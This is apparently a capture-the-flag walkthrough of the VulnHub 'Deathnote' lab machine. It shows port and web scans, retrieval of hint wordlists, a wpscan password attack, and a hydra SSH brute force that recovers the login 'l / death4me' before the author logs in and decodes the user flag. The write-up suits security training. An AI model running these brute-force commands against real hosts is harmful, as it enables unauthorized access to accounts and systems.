@@ -1,0 +1,808 @@
+Discovering IP address:
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                           
+                                                                                                                                                                         
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                         
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                        
+ 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                        
+ 10.0.2.3        08:00:27:1e:1a:84      1      60  PCS Systemtechnik GmbH                                                                                                
+ 10.0.2.11       08:00:27:64:60:ff      1      60  PCS Systemtechnik GmbH                                                                                                
+
+Rustscan:
+
+rustscan -a 10.0.2.11
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Scanning ports faster than you can say 'SYN ACK'
+
+[~] The config file is expected to be at "/home/gabi/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.0.2.11:22
+Open 10.0.2.11:80
+[~] Starting Script(s)
+[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 09:44 EDT
+Initiating ARP Ping Scan at 09:44
+Scanning 10.0.2.11 [1 port]
+Completed ARP Ping Scan at 09:44, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:44
+Completed Parallel DNS resolution of 1 host. at 09:44, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 09:44
+Scanning 10.0.2.11 [2 ports]
+Discovered open port 80/tcp on 10.0.2.11
+Discovered open port 22/tcp on 10.0.2.11
+Completed SYN Stealth Scan at 09:44, 0.03s elapsed (2 total ports)
+Nmap scan report for 10.0.2.11
+Host is up, received arp-response (0.00090s latency).
+Scanned at 2025-06-18 09:44:10 EDT for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 08:00:27:64:60:FF (Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
+           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
+
+
+
+
+Nmap:
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ nmap -sC -sV -vv -p- 10.0.2.11   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 09:45 EDT
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.00s elapsed
+Initiating ARP Ping Scan at 09:45
+Scanning 10.0.2.11 [1 port]
+Completed ARP Ping Scan at 09:45, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:45
+Completed Parallel DNS resolution of 1 host. at 09:45, 0.01s elapsed
+Initiating SYN Stealth Scan at 09:45
+Scanning 10.0.2.11 [65535 ports]
+Discovered open port 80/tcp on 10.0.2.11
+Discovered open port 22/tcp on 10.0.2.11
+Completed SYN Stealth Scan at 09:45, 16.51s elapsed (65535 total ports)
+Initiating Service scan at 09:45
+Scanning 2 services on 10.0.2.11
+Completed Service scan at 09:45, 9.17s elapsed (2 services on 1 host)
+NSE: Script scanning 10.0.2.11.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.28s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.01s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.00s elapsed
+Nmap scan report for 10.0.2.11
+Host is up, received arp-response (0.00036s latency).
+Scanned at 2025-06-18 09:45:26 EDT for 26s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm89TpyON8aYXST7z9QwF/lZeqXiejtLOaVDmyxME7S2M1Z+57KxnB8ixV0MArX+cNTWO92xYlTiYKIKusPwrB43AArYrnHTLUg79N59GhbreA8yX2xxwuJq/+tu2ieMS7QORyKJVZCRwV/EVHknQyg+jrXLtD74C869l9wb3S9yIeSK1UGNrbdAgOPZtG4pFFRcKghC4wtuukqaE7uIv4yO8mHOo+p+V8+Ab3tbmIG2KZLbb3hW3vjKc4XxBnoJTWwsX6zkV/1HnfE+ptFzs0sHWpyiAKtUGs4AkfymcG5SDyuAkBBiABpBbzBK/Lzcjhb7dJGpqPac+M+lxIb+T1
+|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCh/urbdjg8yYyJTf6zXc0OVNr9nZ8BXv26XthpOdSCdnIMLKNmlAbONw9KKJ05/BS/7T+zg/LHdA5FAAHL8OFw=
+|   256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9njk3MGTFBM1ueTjfLjhVUE0a485AyO7kFm0enSRap
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+MAC Address: 08:00:27:64:60:FF (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:45
+Completed NSE at 09:45, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.73 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+
+
+
+
+Nikto:
+ nikto -h http://10.0.2.11
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.11
++ Target Hostname:    10.0.2.11
++ Target Port:        80
++ Start Time:         2025-06-18 09:43:19 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Server may leak inodes via ETags, header found with file /, inode: c5, size: 5cb285991624e, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
++ /manual/: Web server manual found.
++ /manual/images/: Directory indexing found.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
++ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
++ /wordpress/wp-admin/: Uncommon header 'x-redirect-by' found, with contents: WordPress.
++ /wordpress/: Drupal Link header found with value: <http://deathnote.vuln/wordpress/index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
++ /wordpress/: A Wordpress installation was found.
++ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /wordpress/wp-content/uploads/: Directory indexing found.
++ /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
++ /wordpress/wp-login.php: Wordpress login found.
++ 8102 requests: 0 error(s) and 17 item(s) reported on remote host
++ End Time:           2025-06-18 09:43:46 (GMT-4) (27 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+wpscan:
+
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ wpscan --url http://10.0.2.11/wordpress/ --enumerate u 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.0.2.11/wordpress/ [10.0.2.11]
+[+] Started: Wed Jun 18 09:44:40 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.0.2.11/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.0.2.11/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.0.2.11/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.0.2.11/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.0.2.11/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.8'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.0.2.11/wordpress/, Match: 'WordPress 5.8'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] kira
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jun 18 09:44:42 2025
+[+] Requests Done: 57
+[+] Cached Requests: 4
+[+] Data Sent: 13.214 KB
+[+] Data Received: 13.716 MB
+[+] Memory used: 158.887 MB
+[+] Elapsed time: 00:00:01
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ wpscan --url http://10.0.2.11/wordpress/              
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.0.2.11/wordpress/ [10.0.2.11]
+[+] Started: Wed Jun 18 09:45:07 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.0.2.11/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.0.2.11/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.0.2.11/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.0.2.11/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.0.2.11/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.8'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.0.2.11/wordpress/, Match: 'WordPress 5.8'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <============================================================================================> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jun 18 09:45:10 2025
+[+] Requests Done: 140
+[+] Cached Requests: 28
+[+] Data Sent: 36.833 KB
+[+] Data Received: 20.003 KB
+[+] Memory used: 251.129 MB
+[+] Elapsed time: 00:00:02
+
+
+
+FFUF:
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.2.11/FUZZ -fc 403 -t 100
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.11/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+                        [Status: 200, Size: 197, Words: 23, Lines: 10, Duration: 262ms]
+index.html              [Status: 200, Size: 197, Words: 23, Lines: 10, Duration: 1ms]
+manual                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 1ms]
+robots.txt              [Status: 200, Size: 68, Words: 11, Lines: 5, Duration: 0ms]
+wordpress               [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 2ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.0.2.11/FUZZ -fc 403 -t 100 
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.11/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+manual                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 7ms]
+robots.txt              [Status: 200, Size: 68, Words: 11, Lines: 5, Duration: 5ms]
+wordpress               [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 5ms]
+:: Progress: [20469/20469] :: Job [1/1] :: 744 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ 
+
+
+Robots.txt gives us a new username:
+ fuck it my dad 
+added hint on /important.jpg
+
+ryuk please delete it
+
+when visiting 10.0.2.11/important.jpg, there's a message saying that it cannot display the image, but we can download it:
+
+──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ wget http://10.0.2.11/important.jpg                                                                                        
+--2025-06-18 09:50:43--  http://10.0.2.11/important.jpg
+Connecting to 10.0.2.11:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 277 [image/jpeg]
+Saving to: ‘important.jpg’
+
+important.jpg                              100%[=======================================================================================>]     277  --.-KB/s    in 0s      
+
+2025-06-18 09:50:43 (19.5 MB/s) - ‘important.jpg’ saved [277/277]
+
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ ls                          
+important.jpg
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ file important.jpg                                                               
+important.jpg: ASCII text
+                                                                                                                                                                           
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ strings important.jpg 
+i am Soichiro Yagami, light's father
+i have a doubt if L is true about the assumption that light is kira
+i can only help you by giving something important
+login username : user.txt
+i don't know the password.
+find it by yourself 
+but i think it is in the hint section of site
+
+
+
+going back to the website 10.0.2.11 and cliking on the hint, we get this info:
+
+
+
+Find a notes.txt file on server
+
+or
+
+SEE the L comment
+
+my fav line is iamjustic3
+
+    L on i will eliminate you L!
+
+
+
+
+    Nikto results, show that the uploads section is available for browsing,
+
+    we can get both files on our machine:
+
+    wget http://10.0.2.11/wordpress/wp-content/uploads/2021/07/notes.txt                                                       
+--2025-06-18 09:56:04--  http://10.0.2.11/wordpress/wp-content/uploads/2021/07/notes.txt
+Connecting to 10.0.2.11:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 449 [text/plain]
+Saving to: ‘notes.txt’
+
+notes.txt                                  100%[=======================================================================================>]     449  --.-KB/s    in 0s      
+
+2025-06-18 09:56:04 (55.3 MB/s) - ‘notes.txt’ saved [449/449]
+
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ ls                          
+important.jpg  notes.txt
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ cat notes.txt                                           
+death4
+death4life
+death4u
+death4ever
+death4all
+death420
+death45
+death4love
+death49
+death48
+death456
+death4014
+1death4u
+yaydeath44
+thedeath4u2
+thedeath4u
+stickdeath420
+reddeath44
+megadeath44
+megadeath4
+killdeath405
+hot2death4sho
+death4south
+death4now
+death4l0ve
+death4free
+death4elmo
+death4blood
+death499Eyes301
+death498
+death4859
+death47
+death4545
+death445
+death444
+death4387n
+death4332387
+death42521439
+death42
+death4138
+death411
+death405
+death4me
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ wgethttp://10.0.2.11/wordpress/wp-content/uploads/2021/07/user.txt  
+zsh: no such file or directory: wgethttp://10.0.2.11/wordpress/wp-content/uploads/2021/07/user.txt
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ wget http://10.0.2.11/wordpress/wp-content/uploads/2021/07/user.txt
+--2025-06-18 09:56:38--  http://10.0.2.11/wordpress/wp-content/uploads/2021/07/user.txt
+Connecting to 10.0.2.11:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 91 [text/plain]
+Saving to: ‘user.txt’
+
+user.txt                                   100%[=======================================================================================>]      91  --.-KB/s    in 0s      
+
+2025-06-18 09:56:38 (11.8 MB/s) - ‘user.txt’ saved [91/91]
+
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ ls
+important.jpg  notes.txt  user.txt
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ cat user.txt 
+KIRA
+L
+ryuk
+rem
+misa
+siochira 
+light
+takada
+near
+mello
+l
+kira
+RYUK
+REM
+SIOCHIRA
+LIGHT
+NEAR
+
+
+then we can use wpscan to see if we can bruteforce the login:
+
+                                                                                                                                                                           
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ wpscan --url http://10.0.2.11/wordpress/  --usernames user.txt --passwords notes.txt
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.0.2.11/wordpress/ [10.0.2.11]
+[+] Started: Wed Jun 18 09:59:04 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.0.2.11/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.0.2.11/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.0.2.11/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.0.2.11/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.0.2.11/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.8'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.0.2.11/wordpress/, Match: 'WordPress 5.8'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <============================================================================================> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 17 user/s
+Trying NEAR / death4me Time: 00:00:23 <================================================================================================> (731 / 731) 100.00% Time: 00:00:23
+
+[i] No Valid Passwords Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jun 18 09:59:31 2025
+[+] Requests Done: 897
+[+] Cached Requests: 4
+[+] Data Sent: 433.938 KB
+[+] Data Received: 538.421 KB
+[+] Memory used: 244.984 MB
+[+] Elapsed time: 00:00:26
+
+
+
+This doesn't work,but we can try to bruteforce ssh:
+
+──(gabi㉿kali)-[~/Documents/Vulnhub/Deathnote]
+└─$ hydra -L user.txt -P notes.txt ssh://10.0.2.11 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-18 10:00:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 731 login tries (l:17/p:43), ~46 tries per task
+[DATA] attacking ssh://10.0.2.11:22/
+[STATUS] 295.00 tries/min, 295 tries in 00:01h, 438 to do in 00:02h, 14 active
+[22][ssh] host: 10.0.2.11   login: l   password: death4me
+[STATUS] 286.50 tries/min, 573 tries in 00:02h, 160 to do in 00:01h, 14 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-18 10:02:40
+
+
+
+we can ssh to the machine:
+
+ssh l@10.0.2.11                        
+The authenticity of host '10.0.2.11 (10.0.2.11)' can't be established.
+ED25519 key fingerprint is SHA256:Pj7G++7sat/zpoeFTsy5FUba1luVvaIo7NG0PdXzxY8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.11' (ED25519) to the list of known hosts.
+l@10.0.2.11's password: 
+Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Sep  4 06:12:29 2021 from 192.168.1.6
+l@deathnote:~$ 
+
+
+user flag:
+@deathnote:~$ ls
+user.txt
+l@deathnote:~$ cat user.txt
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
+
+
+
+this seems like brainfuck, but we can decode it online:
+
+i think u got the shell , but you wont be able to kill me -kira
+
+
+
+PRIVESC:
+
+
+L cannot run sudo, so I started to enumerate the machine.
+
+
